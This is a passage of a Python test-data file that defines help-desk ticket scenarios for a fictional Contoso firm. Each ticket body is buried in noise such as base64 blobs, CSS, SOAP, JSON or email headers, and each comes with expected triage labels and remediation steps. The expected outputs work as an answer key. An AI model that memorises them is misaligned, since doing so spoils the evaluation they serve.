                "b2JqCjMgMCBvYmoKPDwKL1R5cGUgL1BhZ2UKL1BhcmVudCAyIDAgUgovUmVz"
                "b3VyY2VzIDw8Ci9Gb250IDw8Ci9GMSAxNiAwIFIKPj4KPj4KL0NvbnRlbnRz"
                "IDQgMCBSCj4+CmVuZG9iagozIDAgb2JqCjw8Ci9UeXBlIC9QYWdlCi9QYXJl"
                "bnQgMiAwIFIKL1Jlc291cmNlcyA8PAovRm9udCA8PAovRjEgMTYgMCBSCj4+"
                "Cj4+Ci9Db250ZW50cyA0IDAgUgo+PgplbmRvYmoKNCAwIG9iago8PAovTGVu"
                "Z3RoIDQ0Cj4+CnN0cmVhbQpCVAovRjEgMTIgVGYKMTAwIDcwMCBUZAooU29m"
                "dHdhcmUgTGljZW5zZSBSZW5ld2FsIEZvcm0pIFRqCkVUCmVuZHN0cmVhbQpl"
                "bmRvYmoKNSAwIG9iago8PAovVHlwZSAvRm9udAovU3VidHlwZSAvVHlwZTEK"
                "L0Jhc2VGb250IC9IZWx2ZXRpY2EKPj4KZW5kb2JqCnhyZWYKMCA2CjAwMDAw"
                "MDAwMDAgNjU1MzUgZiAKMDAwMDAwMDAwOSAwMDAwMCBuIAowMDAwMDAwMDU4"
                "IDAwMDAwIG4gCjAwMDAwMDAxMTUgMDAwMDAgbiAKMDAwMDAwMDI2NiAwMMDAwIG4gBiag"
                "L1R5cGUgL0ZvbnQKL1N1YnR5cGUgL1R5cGUxCi9CYXNlRm9udCAvSGVsdmV0"
                "aWNhCj4+CmVuZG9iagp4cmVmCjAgNgowMDAwMDAwMDAwIDY1NTM1IGYgCjAw"
                "MDAwMDAwMDkgMDAwMDAgbiAKMDAwMDAwMDA1OCAwMDAwMCBuIAowMDAwMDAw"
                "MDAwMDAwMDAwMDAwMDAgbjsgAgMDAwMDAwMDEKPj4Kc3RhcnR4cmVmCjU0OAol"
                "JUVPRA==\n\n"
                "Anyway, the license is for Bloomberg Terminal, seat ID BT-4471, "
                "assigned to me on the trading floor (Building 4, 12th floor). My "
                "manager David Kowalski already approved the renewal. Can you "
                "please process this before March 31?\n\n"
                "Thanks,\nRachel Moreno\nFixed Income Trading"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Process Bloomberg Terminal license renewal for seat ID BT-4471 "
                "assigned to Rachel Moreno before the March 31 expiration. Manager "
                "approval from David Kowalski is referenced. Discard the inline "
                "base64 PDF content and request a clean copy of the approval form."
            ),
            remediation_steps=[
                "Request Rachel resend the manager approval PDF as a proper email attachment.",
                "Verify the Bloomberg seat ID BT-4471 in the license management portal "
                "and confirm the current expiration date.",
                "Submit the renewal request through the enterprise software procurement workflow "
                "with manager approval attached.",
                "Confirm with Bloomberg vendor support that the renewal will be processed before month-end cutoff.",
                "Notify Rachel once the renewal is confirmed and verify terminal connectivity.",
            ],
            reporter_name="Rachel Moreno",
            reporter_email="rachel.moreno@contoso.com",
            reporter_department="Fixed Income Trading",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "base64", "pdf-inline", "binary-content"],
            difficulty="hard",
        ),
        # ── DC-041  Massive inline CSS/HTML style blocks ──────────────────
        ScenarioDefinition(
            scenario_id="DC-041",
            subject="SharePoint site not loading — just spins",
            description=(
                '<style type="text/css">\n'
                "/* Outlook Web App Reset Styles */\n"
                "body { margin: 0; padding: 0; -webkit-text-size-adjust: 100%; "
                "-ms-text-size-adjust: 100%; }\n"
                "table, td { border-collapse: collapse; mso-table-lspace: 0pt; "
                "mso-table-rspace: 0pt; }\n"
                "img { border: 0; height: auto; line-height: 100%; outline: none; "
                "text-decoration: none; -ms-interpolation-mode: bicubic; }\n"
                ".ExternalClass { width: 100%; }\n"
                ".ExternalClass, .ExternalClass p, .ExternalClass span, "
                ".ExternalClass font, .ExternalClass td, .ExternalClass div "
                "{ line-height: 100%; }\n"
                ".ReadMsgBody { width: 100%; background-color: #f4f4f4; }\n"
                "#outlook a { padding: 0; }\n"
                ".contoso-header { background-color: #003366; color: #ffffff; "
                "padding: 16px 24px; font-family: Segoe UI, Arial, sans-serif; "
                "font-size: 18px; font-weight: 600; }\n"
                ".contoso-body { background-color: #ffffff; padding: 24px; "
                "font-family: Segoe UI, Arial, sans-serif; font-size: 14px; "
                "line-height: 1.6; color: #333333; }\n"
                ".contoso-footer { background-color: #f0f0f0; padding: 12px 24px; "
                "font-family: Segoe UI, Arial, sans-serif; font-size: 11px; "
                "color: #999999; }\n"
                "@media only screen and (max-width: 600px) {\n"
                "  .contoso-header { font-size: 14px !important; padding: 12px "
                "16px !important; }\n"
                "  .contoso-body { padding: 16px !important; font-size: 13px "
                "!important; }\n"
                "  .contoso-footer { padding: 8px 16px !important; }\n"
                "  table[class=container] { width: 100% !important; }\n"
                "}\n"
                "@media only screen and (max-width: 480px) {\n"
                "  .hide-mobile { display: none !important; }\n"
                "  .full-width { width: 100% !important; }\n"
                "}\n"
                "</style>\n"
                '<div class="contoso-body">\n'
                "Hi IT team, the Regulatory Filings SharePoint site "
                "(https://contoso.sharepoint.com/sites/RegulatoryFilings) "
                "has been stuck on a loading spinner since this morning. I have tried "
                "Edge and Chrome, cleared my cache, and even tried from my phone on "
                "cellular data. My colleagues Nadia and Tom in the same department "
                "are also unable to load it. We have a filing deadline on Thursday "
                "and all our draft documents are stored there. Please prioritize.\n"
                "Thanks, Gregory\n"
                "</div>\n"
                '<div class="contoso-footer">\n'
                "Contoso Financial Services | Confidential\n"
                "</div>"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P3,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.TIMESTAMP],
            next_best_action=(
                "Investigate the Regulatory Filings SharePoint site failing to load "
                "for multiple users — Gregory, Nadia, and Tom in Regulatory Affairs "
                "are all affected. Filing deadline on Thursday makes this time-sensitive. "
                "Ignore the CSS/style block noise in the ticket."
            ),
            remediation_steps=[
                "Check the SharePoint admin center for service health alerts affecting "
                "the Regulatory Filings site collection.",
                "Verify site collection storage quota — a full quota can cause infinite loading spinners.",
                "Review recent changes to site permissions or page customizations that may have broken rendering.",
                "Test access with a SharePoint admin account to determine if the issue is "
                "site-wide or permission-specific.",
                "If the site collection is corrupted, initiate a restore from the most recent "
                "backup and notify affected users.",
            ],
            reporter_name="Gregory Ashworth",
            reporter_email="gregory.ashworth@contoso.com",
            reporter_department="Regulatory Affairs",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "css-noise", "html-heavy", "style-blocks"],
            difficulty="medium",
        ),
        # ── DC-042  XML/SOAP envelope wrapping the actual issue ───────────
        ScenarioDefinition(
            scenario_id="DC-042",
            subject="[AUTO] Service Alert — AppGateway timeout detected",
            description=(
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                "<soap:Envelope\n"
                '    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"\n'
                '    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
                '    xmlns:mon="http://contoso.com/monitoring/v2"\n'
                '    xmlns:alert="http://contoso.com/alerting/2026">\n'
                "  <soap:Header>\n"
                "    <mon:MonitoringContext>\n"
                "      <mon:CorrelationId>a9f3c7e2-81d4-4b6a-bc0f-3e7d91a24c88"
                "</mon:CorrelationId>\n"
                "      <mon:Timestamp>2026-03-17T14:32:08.441Z</mon:Timestamp>\n"
                "      <mon:Source>PROD-APPGW-East-02</mon:Source>\n"
                "      <mon:Environment>Production</mon:Environment>\n"
                "      <mon:Severity>Critical</mon:Severity>\n"
                "      <mon:ServiceTree>\n"
                "        <mon:Organization>Contoso Financial Services</mon:Organization>\n"
                "        <mon:Division>Technology</mon:Division>\n"
                "        <mon:Team>Platform Engineering</mon:Team>\n"
                "      </mon:ServiceTree>\n"
                "    </mon:MonitoringContext>\n"
                "    <alert:EscalationPolicy>\n"
                "      <alert:Level>P2</alert:Level>\n"
                "      <alert:NotifyGroup>enterprise-apps-oncall</alert:NotifyGroup>\n"
                "      <alert:AutoResolveMinutes>60</alert:AutoResolveMinutes>\n"
                "    </alert:EscalationPolicy>\n"
                "  </soap:Header>\n"
                "  <soap:Body>\n"
                "    <mon:AlertPayload>\n"
                "      <mon:AlertType>ServiceTimeout</mon:AlertType>\n"
                "      <mon:AffectedService>TradeSettlement-API</mon:AffectedService>\n"
                "      <mon:Endpoint>https://api.contoso.com/v2/trade/settlement"
                "</mon:Endpoint>\n"
                "      <mon:Description>The TradeSettlement-API service endpoint "
                "has exceeded the 30-second response timeout threshold for 12 "
                "consecutive health checks. Average response time over the last "
                "15 minutes is 47.3 seconds. Downstream dependencies including "
                "the clearing house integration and position reconciliation service "
                "are experiencing cascading failures. 23 pending settlement requests "
                "are queued and at risk of missing the T+1 settlement window."
                "</mon:Description>\n"
                "      <mon:MetricsSummary>\n"
                "        <mon:AvgResponseMs>47312</mon:AvgResponseMs>\n"
                "        <mon:ErrorRate>0.34</mon:ErrorRate>\n"
                "        <mon:ActiveConnections>847</mon:ActiveConnections>\n"
                "        <mon:QueueDepth>23</mon:QueueDepth>\n"
                "      </mon:MetricsSummary>\n"
                "    </mon:AlertPayload>\n"
                "  </soap:Body>\n"
                "</soap:Envelope>"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=True,
            missing_info=[MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Investigate TradeSettlement-API timeout on PROD-APPGW-East-02 — "
                "response times averaging 47s (threshold 30s), 34% error rate, "
                "23 settlement requests at risk of missing the T+1 window. "
                "Escalate to Platform Engineering immediately."
            ),
            remediation_steps=[
                "Check application gateway and load balancer health for PROD-APPGW-East-02 in the Azure portal.",
                "Review TradeSettlement-API application logs for the correlation ID "
                "a9f3c7e2-81d4-4b6a-bc0f-3e7d91a24c88.",
                "Investigate downstream clearing house integration for connection pool "
                "exhaustion or certificate issues.",
                "If the API is overloaded, scale out additional instances and drain the pending settlement queue.",
                "Coordinate with the settlements operations team to manually process "
                "any trades at risk of missing T+1 cutoff.",
            ],
            reporter_name="PROD-APPGW-East-02 (Automated Monitor)",
            reporter_email="monitoring-alerts@contoso.com",
            reporter_department="Platform Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "xml-soap", "envelope-noise", "machine-generated"],
            difficulty="hard",
        ),
        # ── DC-043  Inline SQL query dump from error report ───────────────
        ScenarioDefinition(
            scenario_id="DC-043",
            subject="Production report query keeps timing out",
            description=(
                "Hi team,\n\n"
                "My daily P&L reconciliation report has been timing out since "
                "Monday morning. The query runs against the production warehouse "
                "and normally finishes in about 2 minutes, but now it just hangs "
                "until the 30-minute timeout kills it. Here is the query I'm "
                "running:\n\n"
                "SELECT\n"
                "    t.trade_id,\n"
                "    t.trade_date,\n"
                "    t.settlement_date,\n"
                "    t.counterparty_id,\n"
                "    cp.counterparty_name,\n"
                "    cp.lei_code,\n"
                "    t.instrument_type,\n"
                "    t.isin,\n"
                "    sec.security_description,\n"
                "    sec.currency_code,\n"
                "    t.quantity,\n"
                "    t.price,\n"
                "    t.notional_amount,\n"
                "    t.accrued_interest,\n"
                "    t.net_settlement_amount,\n"
                "    t.trade_status,\n"
                "    pos.start_of_day_position,\n"
                "    pos.end_of_day_position,\n"
                "    pos.realized_pnl,\n"
                "    pos.unrealized_pnl,\n"
                "    pos.total_pnl,\n"
                "    fx.exchange_rate,\n"
                "    fx.rate_source,\n"
                "    CASE\n"
                "        WHEN t.notional_amount > 10000000 THEN 'LARGE'\n"
                "        WHEN t.notional_amount > 1000000 THEN 'MEDIUM'\n"
                "        ELSE 'SMALL'\n"
                "    END AS trade_size_bucket,\n"
                "    COALESCE(r.regulatory_flag, 'NONE') AS reg_flag\n"
                "FROM trades t\n"
                "INNER JOIN counterparties cp ON t.counterparty_id = cp.counterparty_id\n"
                "INNER JOIN securities sec ON t.isin = sec.isin\n"
                "LEFT JOIN positions pos ON t.trade_id = pos.trade_id\n"
                "    AND pos.position_date = t.trade_date\n"
                "LEFT JOIN fx_rates fx ON sec.currency_code = fx.currency_code\n"
                "    AND fx.rate_date = t.trade_date\n"
                "LEFT JOIN regulatory_flags r ON t.trade_id = r.trade_id\n"
                "WHERE t.trade_date BETWEEN '2026-03-01' AND '2026-03-17'\n"
                "    AND t.trade_status IN ('CONFIRMED', 'SETTLED', 'PENDING')\n"
                "    AND t.book_id IN (\n"
                "        SELECT book_id FROM book_permissions\n"
                "        WHERE analyst_id = 'HWONG'\n"
                "    )\n"
                "ORDER BY t.trade_date DESC, t.notional_amount DESC;\n\n"
                "Nothing changed on my end — same query I run every day. I suspect "
                "something happened to the database indexes over the weekend. "
                "Can someone from the data platform team investigate?\n\n"
                "Thanks,\nHenry Wong\nPortfolio Analytics, Building 4"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Investigate production data warehouse query timeout for Henry Wong's "
                "daily P&L reconciliation report — previously ran in ~2 minutes, now "
                "exceeds the 30-minute timeout. Likely index fragmentation or statistics "
                "staleness after weekend maintenance."
            ),
            remediation_steps=[
                "Check the data warehouse for any maintenance jobs or schema changes that ran over the weekend.",
                "Review the query execution plan for missing or fragmented indexes on "
                "the trades, positions, and fx_rates tables.",
                "Rebuild or reorganize indexes on high-traffic tables if fragmentation exceeds 30%.",
                "Update table statistics for the affected tables and verify the query plan improves.",
                "If the issue is data volume growth, work with the user to optimize the query "
                "or add appropriate covering indexes.",
            ],
            reporter_name="Henry Wong",
            reporter_email="henry.wong@contoso.com",
            reporter_department="Portfolio Analytics",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "sql-dump", "inline-code", "query-timeout"],
            difficulty="medium",
        ),
        # ── DC-044  Raw markdown source that wasn't rendered ──────────────
        ScenarioDefinition(
            scenario_id="DC-044",
            subject="Teams integration not syncing with calendar",
            description=(
                "# Issue Report: Teams Calendar Integration Failure\n\n"
                "**Reporter:** Amara Osei\n"
                "**Department:** Client Relations\n"
                "**Date:** 2026-03-17\n\n"
                "## Problem Description\n\n"
                "The Microsoft Teams integration with my Outlook calendar has "
                "completely stopped working. When I schedule a meeting in "
                "**Outlook**, it *does not* appear in **Teams**, and vice versa. "
                "This started after the IT department pushed the latest "
                "`Teams Desktop Client v24.7.1` update last Thursday.\n\n"
                "## Steps to Reproduce\n\n"
                "1. Open **Outlook Desktop** and create a new meeting\n"
                "2. Add a Teams link by clicking `Add Teams Meeting`\n"
                "3. Send the invite\n"
                "4. Open **Microsoft Teams** > Calendar tab\n"
                "5. Notice the meeting **does not appear**\n\n"
                "## What I've Tried\n\n"
                "- [x] Signed out and back into Teams\n"
                "- [x] Cleared the Teams cache "
                "(`%appdata%\\Microsoft\\Teams\\Cache`)\n"
                "- [x] Restarted my laptop\n"
                "- [ ] Reinstalled Teams (waiting for IT approval)\n\n"
                "## Expected Behavior\n\n"
                "Meetings created in Outlook should appear in Teams calendar "
                "within ~30 seconds, as documented in the "
                "[Teams admin guide](https://learn.microsoft.com/en-us/microsoftteams"
                "/exchange-teams-interact).\n\n"
                "## Impact\n\n"
                "I have **5+ client meetings daily** and have already missed "
                "joining two calls because they didn't show in Teams. This is "
                "affecting client experience.\n\n"
                "---\n\n"
                "```\n"
                "Teams Version: 24.7.1.0\n"
                "Outlook Version: 16.0.17328.20162\n"
                "OS: Windows 11 Enterprise 23H2\n"
                "```\n\n"
                "Please advise. Thanks!"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P3,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Investigate Teams-Outlook calendar sync failure for Amara Osei after "
                "Teams Desktop Client v24.7.1 update. Meetings created in Outlook do not "
                "appear in Teams calendar. User has already cleared cache and restarted."
            ),
            remediation_steps=[
                "Verify the Exchange-Teams interop prerequisites are met for the user's "
                "mailbox (Exchange Online, not on-prem).",
                "Check the Teams admin center for known issues with client version 24.7.1 and calendar sync.",
                "Re-register the Teams Outlook add-in by running the Teams meeting add-in troubleshooter.",
                "If the add-in is missing, repair the Office installation from Programs and Features.",
                "As a fallback, approve and perform a clean reinstall of the Teams desktop client.",
            ],
            reporter_name="Amara Osei",
            reporter_email="amara.osei@contoso.com",
            reporter_department="Client Relations",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "markdown-artifacts", "unrendered-markup"],
            difficulty="medium",
        ),
        # ── DC-045  Email disclaimer in 5 languages ───────────────────────
        ScenarioDefinition(
            scenario_id="DC-045",
            subject="VPN access request for new project",
            description=(
                "Hello IT,\n\n"
                "I have been assigned to the Cross-Border Settlements project and "
                "need VPN access to the APAC regional network (subnet 10.42.0.0/16). "
                "My manager Isabelle Fontaine has already approved this. Could you "
                "please set this up by end of week?\n\n"
                "Thanks,\nLukas Brenner\nInternational Operations\n\n"
                "═══════════════════════════════════════════════════════════\n"
                "CONFIDENTIALITY NOTICE / AVIS DE CONFIDENTIALITÉ / "
                "VERTRAULICHKEITSHINWEIS / 機密保持に関するご注意 / 保密声明\n"
                "═══════════════════════════════════════════════════════════\n\n"
                "ENGLISH: This email message and any attachments are for the sole "
                "use of the intended recipient(s) and may contain confidential and "
                "privileged information of Contoso Financial Services. Any unauthorized "
                "review, use, disclosure, or distribution is strictly prohibited. If "
                "you are not the intended recipient, please contact the sender by "
                "reply email and destroy all copies of the original message. Receipt "
                "by anyone other than the intended recipient is not a waiver of any "
                "attorney-client, work product, or other applicable privilege.\n\n"
                "FRANÇAIS : Ce message électronique et toute pièce jointe sont "
                "destinés exclusivement au(x) destinataire(s) prévu(s) et peuvent "
                "contenir des informations confidentielles et privilégiées de Contoso "
                "Services Financiers. Toute consultation, utilisation, divulgation ou "
                "distribution non autorisée est strictement interdite. Si vous n'êtes "
                "pas le destinataire prévu, veuillez contacter l'expéditeur par retour "
                "de courriel et détruire toutes les copies du message original. La "
                "réception par toute personne autre que le destinataire prévu ne "
                "constitue pas une renonciation à tout privilège applicable.\n\n"
                "DEUTSCH: Diese E-Mail-Nachricht und alle Anhänge sind ausschließlich "
                "für den/die vorgesehenen Empfänger bestimmt und können vertrauliche "
                "und geschützte Informationen der Contoso Finanzdienstleistungen "
                "enthalten. Jede unbefugte Überprüfung, Nutzung, Offenlegung oder "
                "Verbreitung ist strengstens untersagt. Wenn Sie nicht der vorgesehene "
                "Empfänger sind, kontaktieren Sie bitte den Absender per Antwort-E-Mail "
                "und vernichten Sie alle Kopien der ursprünglichen Nachricht.\n\n"
                "日本語：このメールおよび添付ファイルは、意図された受信者のみを対象としており、"
                "コントソ・ファイナンシャル・サービスの機密情報および特権情報が含まれている"
                "場合があります。許可なく閲覧、使用、開示、または配布することは固く禁じられて"
                "います。意図された受信者でない場合は、返信メールにて送信者にご連絡いただき、"
                "元のメッセージのすべてのコピーを破棄してください。\n\n"
                "中文：本电子邮件及其附件仅供指定收件人使用，可能包含Contoso金融服务公司的"
                "机密和特权信息。未经授权的审阅、使用、披露或分发均被严格禁止。如果您不是"
                "指定的收件人，请通过回复电子邮件联系发件人并销毁原始邮件的所有副本。\n\n"
                "═══════════════════════════════════════════════════════════"
            ),
            category=Category.NETWORK,
            priority=Priority.P3,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.NETWORK_LOCATION, MissingInfo.BUSINESS_IMPACT],
            next_best_action=(
                "Provision VPN access to the APAC regional network (10.42.0.0/16) for "
                "Lukas Brenner for the Cross-Border Settlements project. Verify manager "
                "approval from Isabelle Fontaine and process by end of week."
            ),
            remediation_steps=[
                "Verify the access request approval from Isabelle Fontaine in the access governance portal.",
                "Create a VPN access profile for the APAC regional network subnet "
                "10.42.0.0/16 in the GlobalProtect admin console.",
                "Assign the profile to Lukas Brenner's AD account and add him to "
                "the Cross-Border Settlements security group.",
                "Send the user VPN configuration instructions and test connectivity to an APAC host.",
                "Set a review date for the access in 90 days per the temporary project access policy.",
            ],
            reporter_name="Lukas Brenner",
            reporter_email="lukas.brenner@contoso.com",
            reporter_department="International Operations",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "multilingual-disclaimer", "legal-boilerplate", "very-long-email"],
            difficulty="medium",
        ),
        # ── DC-046  JSON payload from automated monitoring alert ──────────
        ScenarioDefinition(
            scenario_id="DC-046",
            subject="[ALERT] CRITICAL — disk space threshold exceeded",
            description=(
                "{\n"
                '  "alert_id": "MON-2026-031718-4492",\n'
                '  "alert_type": "DiskSpaceThresholdExceeded",\n'
                '  "severity": "CRITICAL",\n'
                '  "timestamp": "2026-03-17T18:14:33.209Z",\n'
                '  "source": {\n'
                '    "hostname": "PROD-SQL-NODE-03.contoso.local",\n'
                '    "ip_address": "10.20.5.43",\n'
                '    "datacenter": "US-East-1",\n'
                '    "rack": "R14-B",\n'
                '    "os": "Windows Server 2022 Datacenter",\n'
                '    "role": "SQL Server Production Node"\n'
                "  },\n"
                '  "disk_metrics": {\n'
                '    "drive_letter": "E:",\n'
                '    "volume_label": "SQLData",\n'
                '    "total_capacity_gb": 2048,\n'
                '    "used_gb": 1946.7,\n'
                '    "free_gb": 101.3,\n'
                '    "percent_used": 95.06,\n'
                '    "threshold_percent": 90,\n'
                '    "growth_rate_gb_per_day": 12.4,\n'
                '    "estimated_days_until_full": 8.2\n'
                "  },\n"
                '  "top_consumers": [\n'
                '    {"database": "TradeHistory", "size_gb": 743.2, '
                '"growth_30d_gb": 89.1},\n'
                '    {"database": "AuditLog", "size_gb": 512.8, '
                '"growth_30d_gb": 156.3},\n'
                '    {"database": "MarketData", "size_gb": 398.4, '
                '"growth_30d_gb": 42.7},\n'
                '    {"database": "ClientPortfolios", "size_gb": 187.1, '
                '"growth_30d_gb": 18.9},\n'
                '    {"database": "TempDB", "size_gb": 105.2, '
                '"growth_30d_gb": 0.0}\n'
                "  ],\n"
                '  "recent_events": [\n'
                '    {"timestamp": "2026-03-15T02:00:00Z", '
                '"event": "Nightly backup completed — 1.2TB transferred"},\n'
                '    {"timestamp": "2026-03-16T02:00:00Z", '
                '"event": "AuditLog retention job FAILED — old records not purged"},\n'
                '    {"timestamp": "2026-03-17T02:00:00Z", '
                '"event": "Nightly backup completed — 1.2TB transferred"}\n'
                "  ],\n"
                '  "escalation": {\n'
                '    "notify_team": "data-platform-oncall",\n'
                '    "auto_ticket": true,\n'
                '    "sla_response_minutes": 60\n'
                "  }\n"
                "}"
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P2,
            team=Team.DATA_PLATFORM,
            needs_escalation=True,
            missing_info=[MissingInfo.PREVIOUS_TICKET_ID],
            next_best_action=(
                "Address critical disk space on PROD-SQL-NODE-03 (E: drive at 95% — "
                "~8 days until full). The AuditLog retention job failed on March 16, "
                "leaving old records unpurged. This is the most likely cause of "
                "accelerated growth. Fix the retention job first, then evaluate "
                "capacity expansion."
            ),
            remediation_steps=[
                "Investigate and fix the failed AuditLog retention job from March 16 "
                "— old records are not being purged.",
                "Manually run the AuditLog purge to reclaim space from records past the retention window.",
                "Review TempDB sizing and shrink if the 105 GB allocation is excessive for current workload.",
                "Request an emergency capacity expansion for the E: drive if free space "
                "drops below 5% before the retention fix takes effect.",
                "Set up a recurring disk space trend report and adjust the growth_rate "
                "alert threshold to trigger earlier.",
            ],
            reporter_name="System Monitor (PROD-SQL-NODE-03)",
            reporter_email="monitoring-alerts@contoso.com",
            reporter_department="Infrastructure Operations",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "json-payload", "machine-generated", "monitoring-alerts"],
            difficulty="hard",
        ),
        # ── DC-047  Excessive whitespace and blank lines ──────────────────
        ScenarioDefinition(
            scenario_id="DC-047",
            subject="Printer on 6th floor not working",
            description=(
                "Hi   IT    Support,\n\n\n\n\n"
                "The    printer   on    the   6th   floor    near   conference   "
                "room   B   is     not     working.\n\n\n\n\n\n\n"
                "It    is    a    HP    LaserJet    Pro    MFP    M428fdn    and   "
                'the     display     says     "Paper   Jam"     but     I   '
                "checked     and     there    is    no     paper     stuck   "
                "anywhere.\n\n\n\n\n\n"
                "I     tried:\n\n\n"
                "-     Turning     it     off     and     on     again\n\n\n"
                "-     Opening     all     the     trays     and     checking   "
                "for     paper\n\n\n"
                "-     Removing     the     toner     cartridge     and   "
                "reinserting     it\n\n\n\n\n\n"
                "Nothing     worked.     The     paper     jam     error   "
                "keeps     coming     back.\n\n\n\n\n"
                "This     is     the     only     printer     on     our   "
                "floor     and     we     have     a     client     presentation   "
                "at     3 PM     today     that     we     need     to   "
                "print     materials     for.\n\n\n\n\n\n\n\n"
                "Please     send     someone     to     look     at     it   "
                "ASAP.\n\n\n\n\n"
                "Thanks,\n\n\n"
                "Olivia     Santos\n\n\n"
                "Client     Advisory,     6th     Floor,     Building   1"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Dispatch a technician to inspect the HP LaserJet Pro MFP M428fdn on "
                "the 6th floor near conference room B, Building 1 — persistent false "
                "paper jam error. User has a client presentation at 3 PM today."
            ),
            remediation_steps=[
                "Dispatch a technician to the 6th floor, Building 1, to physically "
                "inspect the HP LaserJet Pro MFP M428fdn.",
                "Check the paper path sensors for debris, torn paper fragments, or sensor "
                "misalignment causing the false jam.",
                "Perform a full power cycle with the rear access panel open and inspect "
                "the fuser area for obstructions.",
                "If the sensor is faulty, replace the paper path sensor assembly or swap in "
                "a loaner printer before the 3 PM deadline.",
                "Update the printer asset record with any parts replaced and schedule preventive maintenance.",
            ],
            reporter_name="Olivia Santos",
            reporter_email="olivia.santos@contoso.com",
            reporter_department="Client Advisory",
            channel=Channel.CHAT,
            tags=["data-cleanup", "excessive-whitespace", "formatting-noise", "blank-lines"],
            difficulty="easy",
        ),
        # ── DC-048  Corrupted email headers mixed into body ───────────────
        ScenarioDefinition(
            scenario_id="DC-048",
            subject="Account locked out — need urgent help",
            description=(
                "Return-Path: <marcus.adeyemi@contoso.com>\n"
                "Received: from PROD-EXCH-04.contoso.local (10.20.1.44) by\n"
                " PROD-EXCH-HUB-02.contoso.local (10.20.1.10) with Microsoft SMTP\n"
                " Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384)\n"
                " id 15.2.1118.40; Tue, 17 Mar 2026 08:47:12 -0400\n"
                "Received: from outlook.office365.com (52.97.183.26) by\n"
                " PROD-EXCH-04.contoso.local (10.20.1.44) with Microsoft SMTP Server\n"
                " id 15.2.1118.40 via Frontend Transport; Tue, 17 Mar 2026 08:47:11 -0400\n"
                "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;\n"
                " d=contoso.com; s=selector1;\n"
                " h=From:Date:Subject:Message-ID:Content-Type:MIME-Version;\n"
                " bh=a3f2V8bKz0mNpQ7RtL1cD+eXwJk=;\n"
                " b=YjQ4NWRlZWI3ZjJhMTk4NzVkNzRiMmQxZGM5OTNmYTBlZjRiMjVhNWFl\n"
                "   OGEyMTc5ZjRkZGE2MzI0YTVlNWQyZjQ1MzZhMGI3YWIwN2ExMjczNjVk\n"
                "   MjkwNjg2YTgzZGZhYjNlOGE=\n"
                "X-Mailer: Microsoft Outlook 16.0\n"
                "MIME-Version: 1.0\n"
                "Content-Type: multipart/alternative;\n"
                ' boundary="----=_NextPart_001_0078_01DAF3B2.7C8E5A30"\n'
                "X-MS-Exchange-Organization-SCL: -1\n"
                "X-MS-Exchange-Organization-AuthSource: PROD-EXCH-04.contoso.local\n"
                "X-MS-Exchange-Organization-AuthAs: Internal\n"
                "X-MS-Has-Attach:\n"
                "X-MS-TNEF-Correlator:\n\n"
                "Hi IT Support,\n\n"
                "My account has been locked out and I cannot log into anything — "
                "not my laptop, not Outlook, not any of the internal web apps. "
                "This happened at around 8:30 AM this morning when I tried to "
                "sign in after arriving at the office.\n\n"
                "I did NOT change my password recently and I am certain I am "
                "entering the correct credentials. I suspect the lockout may be "
                "related to the MFA push notifications I was getting last night "
                "around 11 PM that I did not initiate — I denied all of them. "
                "Someone may be trying to access my account.\n\n"
                "This is urgent because I have a compliance audit review at "
                "10 AM and I need access to the Regulatory Reporting portal "
                "and my email.\n\n"
                "Please call me at extension 3841.\n\n"
                "Marcus Adeyemi\n"
                "Compliance & Regulatory, Building 2, 9th floor"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=True,
            missing_info=[MissingInfo.AUTHENTICATION_METHOD, MissingInfo.TIMESTAMP],
            next_best_action=(
                "Immediately investigate account lockout for Marcus Adeyemi — "
                "unsolicited MFA prompts at 11 PM suggest a possible credential "
                "compromise attempt. Unlock the account, force a password reset, "
                "review Azure AD sign-in logs, and revoke active sessions before "
                "the 10 AM compliance audit."
            ),
            remediation_steps=[
                "Review Azure AD sign-in logs for Marcus Adeyemi's account for failed "
                "attempts and the unsolicited MFA prompts from 11 PM.",
                "Check if the account triggered any Impossible Travel or Unfamiliar "
                "Sign-In Properties risk detections in Azure AD Identity Protection.",
                "Unlock the account in Active Directory and force an immediate password "
                "reset via a secure channel (phone verification).",
                "Revoke all active refresh tokens and sessions "
                "(Revoke-AzureADUserAllRefreshToken) to invalidate any compromised sessions.",
                "If credential compromise is confirmed, escalate to the Security Operations "
                "team for a full incident investigation.",
            ],
            reporter_name="Marcus Adeyemi",
            reporter_email="marcus.adeyemi@contoso.com",
            reporter_department="Compliance & Regulatory",
            channel=Channel.PHONE,
